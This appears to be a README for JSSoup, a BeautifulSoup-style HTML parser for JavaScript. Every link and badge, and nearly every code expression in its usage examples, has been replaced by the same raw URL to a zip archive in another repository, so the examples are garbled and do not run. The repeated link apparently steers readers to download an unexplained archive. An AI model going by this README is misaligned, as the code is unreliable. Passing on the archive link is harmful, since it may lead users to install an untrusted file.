JSSoup
=============================
I'm a fan of Python library BeautifulSoup. It's feature-rich and very easy to use. But when I am working on a small react-native project, and I tried to find a HTML parser library 
like BeautifulSoup, I failed.  
So I want to write a HTML parser library which can be so easy to use just like BeautifulSoup in Javascript.  
**JSSoup** uses [tautologistics/node-htmlparser](https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip) as HTML dom parser, 
and creates a series of BeautifulSoup like API on top of it.  
JSSoup supports both **node** and **react-native**.  

[![Build Status](https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip)](https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip)
[![npm version](https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip)](https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip)
[![NPM](https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip)](https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip)


# Naming Style
JSSoup tries to use the same interfaces as BeautifulSoup so BeautifulSoup user can use JSSoup seamlessly. 
However, JSSoup uses Javascript's camelCase naming style instead of Python's underscore naming style.
Such as `find_all()` in BeautifulSoup is replaced as `findAll()`.

# Install
```
$ npm install jssoup 
```

# How to use JSSoup
### Import
```javascript
//react-native
import JSSoup from 'jssoup'; 
// nodejs
var JSSoup = require('jssoup').default;
```
### Make Soup
```javascript
var soup = new JSSoup('<html><head>hello</head></html>');
```
> The text element only contains whitespace will be ignored by default. To disable this feature, set second parameter 
of JSSoup to false. This parameter is "ignoreWhitespace" and will be passed into htmlparser.
```javascript
var soup = new JSSoup('<html><head>hello</head></html>', false);
```

### Name
```javascript
var soup = new JSSoup('<html><head>hello</head></html>');
var tag = https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip('head');
https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip
// 'head'
https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip = 'span'
https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip(tag)
//<span>hello</span>
```
### Attributes
```javascript
var soup = new JSSoup('<tag id="hi" class="banner">hello</tag>');
var tag = https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip;
https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip
// {id: 'hi', class: 'banner'} 
https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip = 'test';
https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip(tag)
// <tag id="test" class="banner">hello</tag>
```

### Navigation
#### .previousElement, .nextElement
```javascript
var data = `
<div>
  <a>1</a>
  <b>2</b>
  <c>3</c>
</div>
`
var soup = new JSSoup(data);
var div = https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip;
var b = https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip;
// https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip '2'
var a = https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip;
// https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip '1'
```
#### .previousSibling, .nextSibling
```javascript
var soup = new JSSoup(data);
var div = https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip;
var a = https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip;
var b = https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip;
var c = https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip;
https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip == undefined;
```
#### .contents
```javascript
https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip
// [<a>1</a>, <b>2</b>, <c>3</c>]
```
#### .descendants
```javascript
https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip
// [<a>1</a>, 1, <b>2</b>, 2, <c>3</c>, 3]
```
#### .parent
```javascript
https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip == soup
```
### Edit
#### .extract()
```javascript
https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip();
https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip
// [<a>1</a>, <c>3</c>]
```
#### .append()
```javascript
https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip();
https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip(b)
https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip
// [<a>1</a>, <c>3</c>, <b>2</b>]
```
#### .insert(position, new Element)
```javascript
https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip('', '')
// <d>4</d>
https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip(1, d)
https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip
// [<a>1</a>, <d>4</d>, <b>2</b>, <c>3</c>]
```
#### .replaceWith(new Element)
```javascript
https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip('', '')
// <d>4</d>
https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip(d)
https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip
// [<a>1</a>, <d>4</d>, <c>3</c>]

https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip('new')
https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip
// [<a>1</a>, <d>4</d>, <c>new</c>]
```

### Search
#### .findAll()
```javascript
var data = `
<div>
  <div class="h1"></div>
  <a>hello</a>
</div>
`
var soup = new JSSoup(data);
https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip('a')
// [<a>hello</a>]
https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip('div', 'h1')
// [<div class="h1"></div>]
```
#### .find()
```javascript
var data = `
<div>
  <p> hello </p>
  <p> world </p>
</div>
`
var soup = new JSSoup(data);
https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip('p')
// <p> hello </p>
```
#### .findNextSibling()
```javascript
var data = `
<div>
  <span> test </span>
  <div> div </div>
  <p> hello </p>
  <p> world </p>
</div>
`
var soup = new JSSoup(data);
var span = https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip('span');
https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip('p')
// <p> hello </p>
```
#### .findNextSiblings()
```javascript
var data = `
<div>
  <span> test </span>
  <div> div </div>
  <p> hello </p>
  <p> world </p>
</div>
`
var soup = new JSSoup(data);
var span = https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip('span');
https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip('p')
// <p> hello </p>
// <p> world </p>
```
#### .findPreviousSibling()
```javascript
var data = `
<div>
  <p> hello </p>
  <p> world </p>
  <div> div </div>
  <span> test </span>
</div>
`
var soup = new JSSoup(data);
var span = https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip('span');
https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip('p')
// <p> world </p>
```
#### .findPreviousSiblings()
```javascript
var data = `
<div>
  <p> hello </p>
  <p> world </p>
  <div> div </div>
  <span> test </span>
</div>
`
var soup = new JSSoup(data);
var span = https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip('span');
https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip('p')
// <p> hello </p>
// <p> world </p>
```
### Output
#### .prettify()
```javascript
var soup = new JSSoup('<html><head>hello</head></html>');
https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip()
// <html>
//  <head>
//   hello
//  </head>
// </html>
```
#### .getText(), .text
```javascript
https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip
// '123'
https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip('|')
// '1|2|3'
```
#### .string
```javascript
https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip == '2';
var soup = new JSSoup('<html><head>hello</head></html>');
https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip == 'hello';
```

# Run Test
```
npm test
```
# Status
There's a lot of work need to be done.

